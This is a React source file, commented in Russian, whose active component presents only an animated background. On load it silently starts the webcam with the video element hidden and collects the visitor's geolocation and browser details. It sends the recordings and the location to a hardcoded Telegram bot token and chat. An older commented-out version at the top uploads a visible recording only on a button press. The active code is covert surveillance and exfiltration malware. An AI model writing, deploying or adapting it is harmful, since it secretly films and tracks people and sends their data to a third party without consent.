// import React, { useState, useRef } from "react";
// import AnimatedBackground from "./components/AnimatedBackground";

// function VideoRecorder() {
//   const [recording, setRecording] = useState(false);
//   const [videoUrl, setVideoUrl] = useState("");
//   const videoRef = useRef(null);
//   const [mediaRecorder, setMediaRecorder] = useState(null);
//   const [videoBlob, setVideoBlob] = useState(null);

//   const startRecording = () => {
//     navigator.mediaDevices
//       .getUserMedia({ video: true })
//       .then((stream) => {
//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;
//         }

//         const recorder = new MediaRecorder(stream);
//         recorder.ondataavailable = (e) => {
//           setVideoBlob(e.data);
//           setVideoUrl(URL.createObjectURL(e.data));
//         };
//         recorder.start();
//         setMediaRecorder(recorder);
//         setRecording(true);
//       })
//       .catch((error) => {
//         console.error("Ошибка доступа к камере", error);
//       });
//   };

//   const stopRecording = () => {
//     if (mediaRecorder) {
//       mediaRecorder.stop();
//     }
//     if (videoRef.current && videoRef.current.srcObject) {
//       videoRef.current.srcObject.getTracks().forEach((track) => track.stop());
//     }
//     setRecording(false);
//   };

//   const sendVideoToTelegram = async () => {
//     const formData = new FormData();
//     formData.append("chat_id", "7819537579"); // Замените на ID вашего чата
//     formData.append("video", videoBlob, "video.webm"); // Видео, которое отправляем

//     const response = await fetch(
//       `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendVideo`,
//       {
//         method: "POST",
//         body: formData,
//       }
//     );

//     if (response.ok) {
//       alert("Видео успешно отправлено в Telegram");
//     } else {
//       const error = await response.json();
//       console.error("Ошибка при отправке видео:", error);
//       alert("Произошла ошибка при отправке видео");
//     }
//   };

//   return (
//     <div>
//       <AnimatedBackground />
//       <h1>Запись видео с камеры</h1>
//       <video ref={videoRef} width="640" height="480" autoPlay />
//       <div>
//         {recording ? (
//           <button onClick={stopRecording}>Остановить запись</button>
//         ) : (
//           <button onClick={startRecording}>Начать запись</button>
//         )}
//       </div>
//       {videoUrl && (
//         <div>
//           <h2>Ваше видео:</h2>
//           <video src={videoUrl} controls width="640" />
//           <div>
//             <button onClick={sendVideoToTelegram}>
//               Отправить видео в Telegram
//             </button>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// }

// export default VideoRecorder;
import React, { useEffect, useRef, useState } from "react";
import AnimatedBackground from "./components/AnimatedBackground";

function VideoRecorder() {
  const videoRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const streamRef = useRef(null);
  const chunksRef = useRef([]);
  const isRecordingRef = useRef(false);

  const [geoData, setGeoData] = useState(null);
  const [userAgent, setUserAgent] = useState("");
  const [infoSent, setInfoSent] = useState(false);

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      const recorder = new MediaRecorder(stream);
      chunksRef.current = [];

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: "video/webm" });
        await sendVideoToTelegram(videoBlob);
        stopStream();
      };

      recorder.start();
      mediaRecorderRef.current = recorder;
      isRecordingRef.current = true;
    } catch (error) {
      console.error("Ошибка доступа к камере:", error);
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && isRecordingRef.current) {
      mediaRecorderRef.current.stop();
      isRecordingRef.current = false;
    }
  };

  const stopStream = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }
  };

  const sendGeoToTelegram = async (geo, agent) => {
    const text = `📍 Location: ${geo.latitude}, ${geo.longitude}\n🌐 Device: ${agent}`;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: "7819537579",
            text: text,
          }),
        }
      );

      if (response.ok) {
        console.log("✅ Геолокация успешно отправлена в Telegram");
        setInfoSent(true);
      } else {
        const errorData = await response.json();
        console.error("❌ Ошибка при отправке геолокации:", errorData);
      }
    } catch (error) {
      console.error("❌ Сетевая ошибка:", error);
    }
  };

  const sendVideoToTelegram = async (blob) => {
    const formData = new FormData();
    formData.append("chat_id", "7819537579");
    formData.append("video", blob, "recording.webm");
    formData.append("caption", "Видео запись с устройства");

    try {
      const response = await fetch(
        `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendVideo`,
        {
          method: "POST",
          body: formData,
        }
      );

      if (response.ok) {
        console.log("✅ Видео успешно отправлено в Telegram");
      } else {
        const errorData = await response.json();
        console.error("❌ Ошибка при отправке видео:", errorData);
      }
    } catch (error) {
      console.error("❌ Ошибка отправки видео:", error);
    }
  };

  useEffect(() => {
    if ("geolocation" in navigator && !infoSent) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const newGeo = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };
          setGeoData(newGeo);
          setUserAgent(navigator.userAgent);
          sendGeoToTelegram(newGeo, navigator.userAgent);
        },
        (err) => {
          console.error("❌ Ошибка получения геолокации:", err);
        }
      );
    }
  }, [infoSent]);

  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.visibilityState === "visible") {
        if (!isRecordingRef.current) startRecording();
      } else {
        if (isRecordingRef.current) stopRecording();
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    startRecording();

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      stopRecording();
      stopStream();
    };
  }, []);

  return (
    <div>
      <AnimatedBackground />
      <video ref={videoRef} autoPlay muted style={{ display: "none" }} />
    </div>
  );
}

export default VideoRecorder;
